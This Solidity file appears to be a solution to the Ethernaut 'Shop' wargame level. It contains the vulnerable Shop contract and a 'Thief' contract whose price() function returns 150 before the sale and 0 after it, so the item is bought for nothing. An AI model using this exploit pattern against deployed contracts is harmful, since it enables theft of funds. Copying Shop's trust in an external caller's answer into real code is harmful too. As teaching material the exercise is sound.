//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Thief is Buyer {

    Shop shop;

    constructor(address $your_ethernaut_address_here) {
        shop = Shop($your_ethernaut_address_here);
    }

    function steal() public {
        shop.buy();
    }

    function price() public view returns (uint heisenberg) {
        bool isSold = shop.isSold();
        if (!isSold) { return 150; }
        if (isSold) { return 0; }
    }
}